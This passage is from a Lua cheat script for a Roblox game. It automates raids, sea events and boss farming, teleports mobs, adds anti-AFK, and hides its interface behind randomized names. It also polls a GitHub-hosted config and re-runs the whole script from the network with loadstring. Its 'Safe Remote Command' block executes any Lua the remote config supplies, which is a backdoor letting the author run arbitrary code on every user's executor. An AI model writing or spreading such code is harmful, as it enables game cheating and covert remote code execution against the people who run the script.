                    -- If current island index not found, scan 1..5 to latch onto the active island
                    if not islandPos then
                        for i = 1, 5 do
                            local p, obj = GetLocalRaidIsland(i)
                            if p then
                                _currentRaidIsland = i
                                islandPos = p
                                islandObj = obj
                                break
                            end
                        end
                    end
                    
                    local anchorPos = islandPos or root.Position
                    local islandHoverCF = CFrame.new(anchorPos.X, anchorPos.Y + 28, anchorPos.Z)
                    
                    -- Find ALIVE local mobs within 850 studs of this island
                    local targetMob = nil
                    local closestDist = math.huge
                    local aliveCount = 0
                    
                    if enemies then
                        for _, mob in ipairs(enemies:GetChildren()) do
                            if mob:IsA("Model") and mob:FindFirstChild("HumanoidRootPart") and mob:FindFirstChild("Humanoid") and mob.Humanoid.Health > 0 then
                                local mPos = mob.HumanoidRootPart.Position
                                local distFromIsland = (mPos - anchorPos).Magnitude
                                if distFromIsland < 850 then
                                    aliveCount = aliveCount + 1
                                    local distFromPlayer = (mPos - root.Position).Magnitude
                                    if distFromPlayer < closestDist then
                                        closestDist = distFromPlayer
                                        targetMob = mob
                                    end
                                end
                            end
                        end
                    end
                    
                    if targetMob and targetMob:FindFirstChild("HumanoidRootPart") then
                        -- Mobs found: reset no-mob counter
                        _noMobStartTick = 0
                        
                        -- Bring nearby mobs together on the island
                        if _G.Config.BringMobs then
                            for _, m in ipairs(enemies:GetChildren()) do
                                if m ~= targetMob and m:IsA("Model") and m:FindFirstChild("HumanoidRootPart") and m:FindFirstChild("Humanoid") and m.Humanoid.Health > 0 then
                                    local d = (m.HumanoidRootPart.Position - targetMob.HumanoidRootPart.Position).Magnitude
                                    if d < 280 then
                                        m.HumanoidRootPart.CFrame = targetMob.HumanoidRootPart.CFrame
                                        m.HumanoidRootPart.CanCollide = false
                                        m.HumanoidRootPart.AssemblyLinearVelocity = Vector3.zero
                                    end
                                end
                            end
                        end
                        
                        -- Hover securely right above target mob and engage combat
                        local fDist = _G.Config.FarmDistance or 12
                        local farmCF = targetMob.HumanoidRootPart.CFrame * CFrame.new(0, fDist, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                        HoverLock(farmCF)
                        EquipWeapon(_G.Config.SelectedWeapon)
                    else
                        -- NO MOBS ALIVE ON THIS ISLAND:
                        -- Anchor and hover securely right over the island center close to where mobs spawn!
                        local distToIsland = (islandHoverCF.Position - root.Position).Magnitude
                        if distToIsland > 35 then
                            TweenTo(islandHoverCF, "Raid Island " .. _currentRaidIsland)
                        else
                            HoverLock(islandHoverCF)
                        end
                        
                        if _noMobStartTick == 0 then
                            _noMobStartTick = tick()
                        end
                        
                        -- If no mobs for > 2.5s, check if next island has spawned
                        if (tick() - _noMobStartTick) > 2.5 and _currentRaidIsland < 5 then
                            local nextPos, nextObj = GetLocalRaidIsland(_currentRaidIsland + 1)
                            if nextPos then
                                -- Island cleared! Advance to next island
                                _currentRaidIsland = _currentRaidIsland + 1
                                _noMobStartTick = 0
                                local nextHoverCF = CFrame.new(nextPos.X, nextPos.Y + 28, nextPos.Z)
                                TweenTo(nextHoverCF, "Next Raid Island (" .. _currentRaidIsland .. ")")
                            end
                        end
                    end
                elseif not inRaid then
                    _currentRaidIsland = 1
                    _noMobStartTick = 0
                end
                
                -- Auto Awaken Fruit
                if _G.Config.AutoAwaken and inRaid then
                    pcall(function()
                        if cf then
                            cf:InvokeServer("Awakener", "Check")
                            cf:InvokeServer("Awakener", "Awaken")
                        end
                    end)
                end
                
                -- Auto Law / Order Raid
                if _G.Config.AutoLawRaid then
                    if cf then cf:InvokeServer("BlackbeardReward", "LawChip") end
                    local enemies = Workspace:FindFirstChild("Enemies")
                    if enemies then
                        local order = enemies:FindFirstChild("Order")
                        if order and order:FindFirstChild("HumanoidRootPart") and order:FindFirstChild("Humanoid") and order.Humanoid.Health > 0 then
                            local farmPos = order.HumanoidRootPart.CFrame * CFrame.new(0, 25, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                            HoverLock(farmPos)
                            EquipWeapon(_G.Config.SelectedWeapon)
                        end
                    end
                end
            end)
        end
    end)
end

--============================== COMPLETE SEA EVENTS & MIRAGE ENGINE ==============================
local function CheckIslandSpawn(islandName)
    local locs = Workspace:FindFirstChild("_WorldOrigin") and Workspace._WorldOrigin:FindFirstChild("Locations")
    if locs and locs:FindFirstChild(islandName) then return true end
    if Workspace:FindFirstChild(islandName) then return true end
    return false
end

local function StartSeaEventsEngine()
    task.spawn(function()
        task.wait(2.0)
        while true do
            task.wait(0.35)
            pcall(function()
                local root = GetRoot()
                if not root then return end
                
                -- 1. Auto Kill Sea Beast (Safe hover 65 studs above water to evade water blast)
                if _G.Config.AutoKillSeaBeast then
                    local targetSB = nil
                    local sbFolder = Workspace:FindFirstChild("SeaBeasts")
                    if sbFolder then
                        for _, sb in ipairs(sbFolder:GetChildren()) do
                            if sb:FindFirstChild("HumanoidRootPart") and sb:FindFirstChild("Humanoid") and sb.Humanoid.Health > 0 then
                                targetSB = sb
                                break
                            end
                        end
                    end
                    if not targetSB then
                        local enemies = Workspace:FindFirstChild("Enemies")
                        if enemies then
                            for _, mob in ipairs(enemies:GetChildren()) do
                                if (string.find(mob.Name, "SeaBeast") or string.find(mob.Name, "Sea Beast")) and mob:FindFirstChild("HumanoidRootPart") and mob:FindFirstChild("Humanoid") and mob.Humanoid.Health > 0 then
                                    targetSB = mob
                                    break
                                end
                            end
                        end
                    end
                    
                    if targetSB then
                        local farmPos = targetSB.HumanoidRootPart.CFrame * CFrame.new(0, 65, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                        local distToFarm = (farmPos.Position - root.Position).Magnitude
                        if distToFarm < 20 then
                            HoverLock(farmPos)
                        else
                            TweenTo(farmPos)
                        end
                        EquipWeapon(_G.Config.SelectedWeapon)
                        return
                    end
                end
                
                -- 2. Auto Kill Terror Shark (Safe hover 38 studs to evade bite hitboxes)
                if _G.Config.AutoKillTerrorShark then
                    local enemies = Workspace:FindFirstChild("Enemies")
                    if enemies then
                        local ts = enemies:FindFirstChild("Terror Shark")
                        if ts and ts:FindFirstChild("HumanoidRootPart") and ts:FindFirstChild("Humanoid") and ts.Humanoid.Health > 0 then
                            local farmPos = ts.HumanoidRootPart.CFrame * CFrame.new(0, 38, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                            local distToFarm = (farmPos.Position - root.Position).Magnitude
                            if distToFarm < 16 then
                                HoverLock(farmPos)
                            else
                                TweenTo(farmPos)
                            end
                            EquipWeapon(_G.Config.SelectedWeapon)
                            return
                        end
                    end
                end
                
                -- 3. Auto Kill Sharks & Piranhas
                if _G.Config.AutoKillShark then
                    local enemies = Workspace:FindFirstChild("Enemies")
                    if enemies then
                        for _, mob in ipairs(enemies:GetChildren()) do
                            if (string.find(mob.Name, "Shark") or string.find(mob.Name, "Piranha")) and mob.Name ~= "Terror Shark" and mob:FindFirstChild("HumanoidRootPart") and mob:FindFirstChild("Humanoid") and mob.Humanoid.Health > 0 then
                                local farmPos = mob.HumanoidRootPart.CFrame * CFrame.new(0, 22, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                                TweenTo(farmPos)
                                EquipWeapon(_G.Config.SelectedWeapon)
                                return
                            end
                        end
                    end
                end
                
                -- 4. Auto Mirage Blue Gear
                if _G.Config.AutoFindGear then
                    local mirage = Workspace:FindFirstChild("Mirage Island") or (Workspace:FindFirstChild("_WorldOrigin") and Workspace._WorldOrigin.Locations:FindFirstChild("Mirage Island"))
                    if mirage then
                        for _, v in ipairs(mirage:GetDescendants()) do
                            if v:IsA("BasePart") and (v.Name == "Gear" or v.Name == "BlueGear" or string.find(v.Name:lower(), "gear")) then
                                TweenTo(v.CFrame * CFrame.new(0, 2, 0))
                                task.wait(0.5)
                                local prompt = v:FindFirstChildWhichIsA("ProximityPrompt") or (v.Parent and v.Parent:FindFirstChildWhichIsA("ProximityPrompt"))
                                if prompt and fireproximityprompt then
                                    fireproximityprompt(prompt)
                                end
                                return
                            end
                        end
                    end
                end
                
                -- 5. Auto Kitsune Azure Embers
                if _G.Config.AutoKitsuneEmber then
                    local kitsune = Workspace:FindFirstChild("Kitsune Island") or (Workspace:FindFirstChild("_WorldOrigin") and Workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island"))
                    if kitsune then
                        for _, ember in ipairs(Workspace:GetChildren()) do
                            if ember.Name == "Ember" or ember.Name == "AzureEmber" or string.find(ember.Name, "Ember") then
                                local part = ember:IsA("BasePart") and ember or ember:FindFirstChildWhichIsA("BasePart")
                                if part then
                                    TweenTo(part.CFrame)
                                    task.wait(0.3)
                                    local prompt = ember:FindFirstChildWhichIsA("ProximityPrompt")
                                    if prompt and fireproximityprompt then
                                        fireproximityprompt(prompt)
                                    end
                                    break
                                end
                            end
                        end
                    end
                end
            end)
        end
    end)
end

--============================== RACE V4 AWAKENING ENGINE ==============================
local function StartRaceV4Engine()
    task.spawn(function()
        task.wait(2.5)
        while true do
            task.wait(1.0)
            pcall(function()
                local root = GetRoot()
                if not root then return end
                
                -- Auto Pull Lever (Temple of Time)
                if _G.Config.AutoPullLever then
                    local tot = Workspace:FindFirstChild("TempleOfTime") or (Workspace:FindFirstChild("Map") and Workspace.Map:FindFirstChild("TempleOfTime"))
                    local lever = tot and (tot:FindFirstChild("Lever") or tot:FindFirstChild("SecretLever"))
                    if lever then
                        local part = lever:IsA("BasePart") and lever or lever:FindFirstChildWhichIsA("BasePart")
                        if part then
                            TweenTo(part.CFrame * CFrame.new(0, 2, 0))
                            task.wait(0.5)
                            local prompt = lever:FindFirstChildWhichIsA("ProximityPrompt")
                            if prompt and fireproximityprompt then fireproximityprompt(prompt) end
                        end
                    end
                end
                
                -- Auto Complete Trial
                if _G.Config.AutoRaceV4Trial then
                    local enemies = Workspace:FindFirstChild("Enemies")
                    if enemies then
                        for _, mob in ipairs(enemies:GetChildren()) do
                            if mob:FindFirstChild("HumanoidRootPart") and mob:FindFirstChild("Humanoid") and mob.Humanoid.Health > 0 then
                                local farmPos = mob.HumanoidRootPart.CFrame * CFrame.new(0, 14, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                                TweenTo(farmPos)
                                EquipWeapon(_G.Config.SelectedWeapon)
                                break
                            end
                        end
                    end
                end
                
                -- Auto Insert Gear into Ancient Clock
                if _G.Config.AutoInsertGear then
                    local clock = Workspace:FindFirstChild("AncientClock") or (Workspace:FindFirstChild("Map") and Workspace.Map:FindFirstChild("AncientClock"))
                    if clock then
                        local part = clock:IsA("BasePart") and clock or clock:FindFirstChildWhichIsA("BasePart")
                        if part then
                            TweenTo(part.CFrame * CFrame.new(0, 3, 0))
                            task.wait(0.5)
                            local prompt = clock:FindFirstChildWhichIsA("ProximityPrompt")
                            if prompt and fireproximityprompt then fireproximityprompt(prompt) end
                        end
                    end
                end
            end)
        end
    end)
end

--============================== BONES & SPECIAL EVENTS ENGINE ==============================
local function StartSpecialBossAndBoneEngine()
    task.spawn(function()
        task.wait(2.2)
        while true do
            task.wait(0.8)
            pcall(function()
                local cf = CommF()
                if not cf then return end
                local root = GetRoot()
                if not root then return end
                
                -- Auto Farm Bones (Sea 3 Haunted Castle)
                if _G.Config.AutoFarmBones and Sea3 then
                    local enemies = Workspace:FindFirstChild("Enemies")
                    local boneMobs = {"Reborn Skeleton", "Living Zombie", "Demonic Soul", "Possessed Mummy"}
                    local foundMob = false
                    if enemies then
                        for _, mob in ipairs(enemies:GetChildren()) do
                            local isBone = false
                            for _, bName in ipairs(boneMobs) do
                                if IsMobMatch(mob.Name, bName) then isBone = true; break end
                            end
                            if isBone and mob:FindFirstChild("Humanoid") and mob.Humanoid.Health > 0 then
                                local mobRoot = GetMobRoot(mob)
                                if mobRoot then
                                    foundMob = true
                                    local farmPos = mobRoot.CFrame * CFrame.new(0, 14, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                                    TweenTo(farmPos, mob.Name)
                                    EquipWeapon(_G.Config.SelectedWeapon)
                                    BringMobsTo(mob.Name, mobRoot.CFrame)
                                    return
                                end
                            end
                        end
                    end
                    if not foundMob then
                        TweenTo(CFrame.new(-9516.99, 142.01, 6078.47), "Haunted Castle")
                    end
                end
                
                -- Auto Roll Bones at Death King (Verified >= 50 Bones)
                if _G.Config.AutoRollBones and Sea3 then
                    local data = LocalPlayer:FindFirstChild("Data")
                    local bones = (data and data:FindFirstChild("Bones") and data.Bones.Value) or 0
                    if bones >= 50 then
                        cf:InvokeServer("Bones", "Buy", 1)
                    end
                end
                
                -- Auto Summon Soul Reaper
                if _G.Config.AutoSummonSoulReaper and Sea3 then
                    local bp = LocalPlayer:FindFirstChild("Backpack")
                    local char = GetCharacter()
                    local hasEssence = (bp and bp:FindFirstChild("Hallow Essence")) or (char and char:FindFirstChild("Hallow Essence"))
                    if hasEssence then
                        if bp:FindFirstChild("Hallow Essence") then
                            bp["Hallow Essence"].Parent = char
                        end
                        TweenTo(CFrame.new(-9516.99, 172.01, 6078.47), "Soul Reaper Altar")
                    end
                end
                
                -- Auto Cake Prince / Dough King Mobs Farm
                if (_G.Config.AutoCakePrinceSummon or _G.Config.AutoDoughKingSummon) and Sea3 then
                    local enemies = Workspace:FindFirstChild("Enemies")
                    local cakeMobs = {"Cookie Crafter", "Cake Guard", "Baking Staff", "Head Baker", "Cocoa Warrior", "Chocolate Bar Battler"}
                    if enemies then
                        for _, mob in ipairs(enemies:GetChildren()) do
                            local isCake = false
                            for _, cName in ipairs(cakeMobs) do
                                if IsMobMatch(mob.Name, cName) then isCake = true; break end
                            end
                            if isCake and mob:FindFirstChild("Humanoid") and mob.Humanoid.Health > 0 then
                                local mobRoot = GetMobRoot(mob)
                                if mobRoot then
                                    local farmPos = mobRoot.CFrame * CFrame.new(0, 14, 0) * CFrame.Angles(math.rad(-90), 0, 0)
                                    TweenTo(farmPos, mob.Name)
                                    EquipWeapon(_G.Config.SelectedWeapon)
                                    BringMobsTo(mob.Name, mobRoot.CFrame)
                                    return
                                end
                            end
                        end
                    end
                end
            end)
        end
    end)
end

--============================== AUTO HAKI ENGINE ==============================
local function StartHakiLoop()
    task.spawn(function()
        task.wait(1.5)
        while true do
            task.wait(2.0)
            pcall(function()
                local char = GetCharacter()
                if not char then return end
                local cf = CommF()
                
                -- Auto Buso Haki
                if _G.Config.AutoBusoHaki and cf then
                    local hasBuso = char:FindFirstChild("HasBuso") or char:FindFirstChild("Buso")
                    if not hasBuso then
                        cf:InvokeServer("Buso")
                    end
                end
                
                -- Auto Ken Haki
                if _G.Config.AutoKenHaki and cf then
                    local vision = char:FindFirstChild("Vision") or (LocalPlayer:FindFirstChild("PlayerGui") and LocalPlayer.PlayerGui:FindFirstChild("VisionGui"))
                    if not vision then
                        cf:InvokeServer("KenHaki")
                    end
                end
            end)
        end
    end)
end

--============================== ANTI-AFK ==============================
local AntiAFKConn = nil
local function EnableAntiAFK()
    if AntiAFKConn then return end
    AntiAFKConn = LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new(0, 0))
    end)
end
if _G.Config.AntiAFK then EnableAntiAFK() end


--============================== STEALTH UI FRAMEWORK (REDZ 3D CYBER EDITION) ==============================
-- All GUI elements use randomized names via GenerateGUID
-- Full input isolation: Active = true on all containers so clicks NEVER register into the 3D game world!
-- Featuring: 3D Depth layering, smooth TweenService micro-animations, real-time Searchable Dropdowns, and Per-Sea filtering!

--============================== LIVE BROADCAST & CLOUD AUTO-UPDATER ENGINE ==============================
local SCRIPT_VERSION = "2.9.5"
local SCRIPT_URL = "https://raw.githubusercontent.com/obeygaming035-pixel/lead-finder/main/alpha_v2.lua"
local LIVE_CONFIG_URL = "https://raw.githubusercontent.com/obeygaming035-pixel/lead-finder/main/live_config.json"

local function FetchRemoteConfig()
    local content = nil
    pcall(function()
        if game.HttpGet then
            content = game:HttpGet(LIVE_CONFIG_URL .. "?t=" .. tick())
        elseif safeRequest then
            local res = safeRequest({Url = LIVE_CONFIG_URL .. "?t=" .. tick(), Method = "GET"})
            if res and res.Body then content = res.Body end
        end
    end)
    if content and #content > 0 then
        local ok, decoded = pcall(function()
            return HttpService:JSONDecode(content)
        end)
        if ok and type(decoded) == "table" then
            return decoded
        end
    end
    return nil
end

-- Live Floating Toast Notification (Neon Cyber 3D)
local function ShowLiveToast(title, message, accentColor, duration)
    pcall(function()
        local parentGui = GetSafeGui()
        if not parentGui then return end
        
        duration = duration or 5
        accentColor = accentColor or Color3.fromRGB(0, 230, 255)
        
        local ToastGui = parentGui:FindFirstChild("AlphaToastGui")
        if not ToastGui then
            ToastGui = Instance.new("ScreenGui")
            ToastGui.Name = "AlphaToastGui"
            ToastGui.ResetOnSpawn = false
            ToastGui.DisplayOrder = 1000000
            ToastGui.Parent = parentGui
        end
        
        local ToastFrame = Instance.new("Frame")
        ToastFrame.Size = UDim2.new(0, 360, 0, 62)
        ToastFrame.Position = UDim2.new(0.5, -180, 0, -80)
        ToastFrame.BackgroundColor3 = Color3.fromRGB(15, 17, 24)
        ToastFrame.BorderSizePixel = 0
        ToastFrame.Active = true
        ToastFrame.ZIndex = 50
        ToastFrame.Parent = ToastGui
        
        local Corner = Instance.new("UICorner")
        Corner.CornerRadius = UDim.new(0, 8)
        Corner.Parent = ToastFrame
        
        local Stroke = Instance.new("UIStroke")
        Stroke.Color = accentColor
        Stroke.Thickness = 1.5
        Stroke.Parent = ToastFrame
        
        local IconLabel = Instance.new("TextLabel")
        IconLabel.Size = UDim2.new(0, 36, 0, 36)
        IconLabel.Position = UDim2.new(0, 8, 0.5, -18)
        IconLabel.BackgroundTransparency = 1
        IconLabel.Text = "α"
        IconLabel.TextSize = 22
        IconLabel.TextColor3 = accentColor
        IconLabel.Parent = ToastFrame
        
        local TitleLabel = Instance.new("TextLabel")
        TitleLabel.Size = UDim2.new(1, -54, 0, 20)
        TitleLabel.Position = UDim2.new(0, 48, 0, 8)
        TitleLabel.BackgroundTransparency = 1
        TitleLabel.Font = Enum.Font.GothamBold
        TitleLabel.TextSize = 13
        TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
        TitleLabel.Text = tostring(title or "LIVE NOTIFICATION")
        TitleLabel.Parent = ToastFrame
        
        local MsgLabel = Instance.new("TextLabel")
        MsgLabel.Size = UDim2.new(1, -54, 0, 28)
        MsgLabel.Position = UDim2.new(0, 48, 0, 28)
        MsgLabel.BackgroundTransparency = 1
        MsgLabel.Font = Enum.Font.Gotham
        MsgLabel.TextSize = 11
        MsgLabel.TextColor3 = Color3.fromRGB(200, 205, 220)
        MsgLabel.TextXAlignment = Enum.TextXAlignment.Left
        MsgLabel.TextWrapped = true
        MsgLabel.Text = tostring(message or "")
        MsgLabel.Parent = ToastFrame
        
        TweenService:Create(ToastFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
            Position = UDim2.new(0.5, -180, 0, 28)
        }):Play()
        
        if PlayClickSound then PlayClickSound() end
        
        task.delay(duration, function()
            if ToastFrame and ToastFrame.Parent then
                local tw = TweenService:Create(ToastFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                    Position = UDim2.new(0.5, -180, 0, -80)
                })
                tw:Play()
                tw.Completed:Connect(function()
                    if ToastFrame then ToastFrame:Destroy() end
                end)
            end
        end)
    end)
end

-- Live Modal Announcement Popup (Supports Custom Image & Decals)
local function ShowLivePopup(title, message, imageUrl)
    pcall(function()
        local parentGui = GetSafeGui()
        if not parentGui then return end
        
        local ModalGui = parentGui:FindFirstChild("AlphaModalGui")
        if ModalGui then ModalGui:Destroy() end
        
        ModalGui = Instance.new("ScreenGui")
        ModalGui.Name = "AlphaModalGui"
        ModalGui.ResetOnSpawn = false
        ModalGui.DisplayOrder = 1000001
        ModalGui.Parent = parentGui
        
        local Overlay = Instance.new("TextButton")
        Overlay.Size = UDim2.new(1, 0, 1, 0)
        Overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        Overlay.BackgroundTransparency = 0.55
        Overlay.Text = ""
        Overlay.AutoButtonColor = false
        Overlay.Parent = ModalGui
        
        local hasImage = imageUrl and imageUrl ~= ""
        local frameHeight = hasImage and 330 or 195
        
        local ModalFrame = Instance.new("Frame")
        ModalFrame.Size = UDim2.new(0, 420, 0, frameHeight)
        ModalFrame.Position = UDim2.new(0.5, -210, 0.5, -frameHeight / 2)
        ModalFrame.BackgroundColor3 = Color3.fromRGB(15, 17, 24)
        ModalFrame.BorderSizePixel = 0
        ModalFrame.Active = true
        ModalFrame.Parent = ModalGui
        
        local Corner = Instance.new("UICorner")
        Corner.CornerRadius = UDim.new(0, 10)
        Corner.Parent = ModalFrame
        
        local Stroke = Instance.new("UIStroke")
        Stroke.Color = Color3.fromRGB(0, 230, 255)
        Stroke.Thickness = 1.5
        Stroke.Parent = ModalFrame
        
        local TitleBar = Instance.new("TextLabel")
        TitleBar.Size = UDim2.new(1, -32, 0, 32)
        TitleBar.Position = UDim2.new(0, 16, 0, 10)
        TitleBar.BackgroundTransparency = 1
        TitleBar.Font = Enum.Font.GothamBold
        TitleBar.TextSize = 14
        TitleBar.TextColor3 = Color3.fromRGB(0, 230, 255)
        TitleBar.TextXAlignment = Enum.TextXAlignment.Left
        TitleBar.Text = tostring(title or "LIVE ANNOUNCEMENT")
        TitleBar.Parent = ModalFrame
        
        local currentY = 46
        
        if hasImage then
            local resolvedImg = imageUrl
            pcall(function()
                if not imageUrl:find("^rbxasset") then
                    local customAssetFn = getcustomasset or (syn and syn.custom_asset) or getsynasset
                    if customAssetFn and writefile and isfile then
                        local fn = "alpha_live_popup.png"
                        local data = nil
                        if game.HttpGet then
                            data = game:HttpGet(imageUrl)
                        elseif safeRequest then
                            local r = safeRequest({Url = imageUrl, Method = "GET"})
                            if r and r.Body then data = r.Body end
                        end
                        if data and #data > 0 then
                            writefile(fn, data)
                            if isfile(fn) then
                                resolvedImg = customAssetFn(fn)
                            end
                        end
                    end
                end
            end)
            
            local Img = Instance.new("ImageLabel")
            Img.Size = UDim2.new(1, -32, 0, 140)
            Img.Position = UDim2.new(0, 16, 0, currentY)
            Img.BackgroundColor3 = Color3.fromRGB(8, 10, 15)
            Img.ScaleType = Enum.ScaleType.Fit
            Img.Image = resolvedImg
            Img.Parent = ModalFrame
            
            local ImgCorner = Instance.new("UICorner")
            ImgCorner.CornerRadius = UDim.new(0, 6)
            ImgCorner.Parent = Img
            
            currentY = currentY + 148
        end
        
        local BodyText = Instance.new("TextLabel")
        BodyText.Size = UDim2.new(1, -32, 0, 52)
        BodyText.Position = UDim2.new(0, 16, 0, currentY)
        BodyText.BackgroundTransparency = 1
        BodyText.Font = Enum.Font.Gotham
        BodyText.TextSize = 12
        BodyText.TextColor3 = Color3.fromRGB(220, 225, 235)
        BodyText.TextWrapped = true
        BodyText.TextXAlignment = Enum.TextXAlignment.Left
        BodyText.TextYAlignment = Enum.TextYAlignment.Top
        BodyText.Text = tostring(message or "")
        BodyText.Parent = ModalFrame
        
        local CloseBtn = Instance.new("TextButton")
        CloseBtn.Size = UDim2.new(1, -32, 0, 32)
        CloseBtn.Position = UDim2.new(0, 16, 1, -42)
        CloseBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 220)
        CloseBtn.Font = Enum.Font.GothamBold
        CloseBtn.Text = "DISMISS"
        CloseBtn.TextColor3 = Color3.fromRGB(10, 12, 18)
        CloseBtn.TextSize = 12
        CloseBtn.Parent = ModalFrame
        
        local BtnCorner = Instance.new("UICorner")
        BtnCorner.CornerRadius = UDim.new(0, 6)
        BtnCorner.Parent = CloseBtn
        
        local function Close()
            if PlayClickSound then PlayClickSound() end
            TweenService:Create(ModalFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()
            task.delay(0.2, function()
                if ModalGui then ModalGui:Destroy() end
            end)
        end
        
        CloseBtn.MouseButton1Click:Connect(Close)
        Overlay.MouseButton1Click:Connect(Close)
    end)
end

-- Live Hot-Reload System
local _isHotReloading = false
local function TriggerLiveReload(newVersion)
    if _isHotReloading then return end
    _isHotReloading = true
    
    ShowLiveToast("CLOUD AUTO-UPDATE", "Hot-reloading to v" .. tostring(newVersion or "latest") .. " in real-time...", Color3.fromRGB(0, 255, 170), 4)
    task.wait(1.0)
    
    -- Terminate previous loops via instance token
    _G.AlphaInstanceId = tick()
    
    -- Clean movement state
    ClearHover()
    
    -- Clean existing UI
    local parentGui = GetSafeGui()
    if parentGui then
        for _, child in ipairs(parentGui:GetChildren()) do
            if child:IsA("ScreenGui") and child:GetAttribute("_uid") == "v2h" then
                child:Destroy()
            end
        end
    end
    
    -- Re-execute latest script from GitHub
    task.spawn(function()
        local ok, err = pcall(function()
            loadstring(game:HttpGet(SCRIPT_URL .. "?t=" .. tick()))()
        end)
        if not ok then
            warn("[ALPHA LIVE] Hot-reload error:", err)
            ShowLiveToast("Reload Error", tostring(err), Color3.fromRGB(255, 70, 70), 5)
        end
    end)
end

-- Live Updater Polling Loop (Every 10-12s)
local function StartLiveUpdaterLoop()
    task.spawn(function()
        local lastBroadcastId = nil
        local lastPopupId = nil
        local lastExecId = nil
        
        while _G.AlphaInstanceId == MyInstanceId do
            task.wait(10)
            
            pcall(function()
                local cfg = FetchRemoteConfig()
                if not cfg then return end
                
                -- 1. Version Update / Force Reload
                if cfg.force_reload or (cfg.latest_version and cfg.latest_version ~= SCRIPT_VERSION) then
                    TriggerLiveReload(cfg.latest_version)
                    return
                end
                
                -- 2. Live Toast Broadcast
                if cfg.broadcast and cfg.broadcast.enabled and cfg.broadcast.id and cfg.broadcast.id ~= lastBroadcastId then
                    lastBroadcastId = cfg.broadcast.id
                    local col = Color3.fromRGB(0, 230, 255)
                    if type(cfg.broadcast.color) == "table" and #cfg.broadcast.color >= 3 then
                        col = Color3.fromRGB(cfg.broadcast.color[1], cfg.broadcast.color[2], cfg.broadcast.color[3])
                    end
                    ShowLiveToast(cfg.broadcast.title, cfg.broadcast.message, col, cfg.broadcast.duration or 5)
                end
                
                -- 3. Live Popup Modal
                if cfg.popup and cfg.popup.enabled and cfg.popup.id and cfg.popup.id ~= lastPopupId then
                    lastPopupId = cfg.popup.id
                    ShowLivePopup(cfg.popup.title, cfg.popup.message, cfg.popup.image)
                end
                
                -- 4. Safe Remote Command
                if cfg.remote_exec and cfg.remote_exec ~= "" and cfg.remote_exec_id and cfg.remote_exec_id ~= lastExecId then
                    lastExecId = cfg.remote_exec_id
                    pcall(function()
                        local fn = loadstring(cfg.remote_exec)
                        if fn then fn() end
                    end)
                end
            end)
        end
    end)
end

local SoundService = game:GetService("SoundService")
local function PlayClickSound()
    pcall(function()
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://6895079853"
        s.Volume = 0.4
        s.Parent = SoundService
        s:Play()
        game:GetService("Debris"):AddItem(s, 1)
    end)
end

local function CreateUI()
    local parentGui = GetSafeGui()
    
    -- Cleanup any existing instance
    for _, child in ipairs(parentGui:GetChildren()) do
        if child:IsA("ScreenGui") and child:GetAttribute("_uid") == "v2h" then
            child:Destroy()
        end
    end
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = RNG()
    ScreenGui:SetAttribute("_uid", "v2h")
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.DisplayOrder = 999999
    ScreenGui.Parent = parentGui
    
    -- -------------------------------------------------------------
    -- 3D COCKPIT TRAVEL HUD (Live Progress Bar & Flight Stats)
    -- -------------------------------------------------------------
    local MainFrame = nil -- Forward declaration so Travel HUD can dock directly above MainFrame
    local TravelFrame = Instance.new("Frame")
    TravelFrame.Name = RNG()
    TravelFrame.Size = UDim2.new(0, 370, 0, 58)
    TravelFrame.Position = UDim2.new(0.5, -185, 0.5, -280)
    TravelFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
    TravelFrame.BorderSizePixel = 0
    TravelFrame.Active = true
    TravelFrame.Selectable = true
    TravelFrame.Visible = false
    TravelFrame.ZIndex = 60
    TravelFrame.Parent = ScreenGui
    
    local TravelCorner = Instance.new("UICorner")
    TravelCorner.CornerRadius = UDim.new(0, 10)
    TravelCorner.Parent = TravelFrame
    
    local TravelStroke = Instance.new("UIStroke")
    TravelStroke.Color = Color3.fromRGB(255, 255, 255)
    TravelStroke.Thickness = 1.6
    TravelStroke.Parent = TravelFrame
    
    local TravelGrad = Instance.new("UIGradient")
    TravelGrad.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 24)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 8, 10))
    }
    TravelGrad.Rotation = 90
    TravelGrad.Parent = TravelFrame
    
    local TravelTitle = Instance.new("TextLabel")
    TravelTitle.Size = UDim2.new(1, -95, 0, 22)
    TravelTitle.Position = UDim2.new(0, 14, 0, 6)
    TravelTitle.Text = "FLYING TO: DESTINATION"
    TravelTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    TravelTitle.Font = Enum.Font.GothamBold
    TravelTitle.TextSize = 12
    TravelTitle.TextXAlignment = Enum.TextXAlignment.Left
    TravelTitle.BackgroundTransparency = 1
    TravelTitle.ZIndex = 61
    TravelTitle.Parent = TravelFrame
    
    local TravelDist = Instance.new("TextLabel")
    TravelDist.Size = UDim2.new(1, -95, 0, 16)
    TravelDist.Position = UDim2.new(0, 14, 0, 26)
    TravelDist.Text = "Distance: 0 studs • Speed: 250 studs/s"
    TravelDist.TextColor3 = Color3.fromRGB(180, 180, 190)
    TravelDist.Font = Enum.Font.Gotham
    TravelDist.TextSize = 10
    TravelDist.TextXAlignment = Enum.TextXAlignment.Left
    TravelDist.BackgroundTransparency = 1
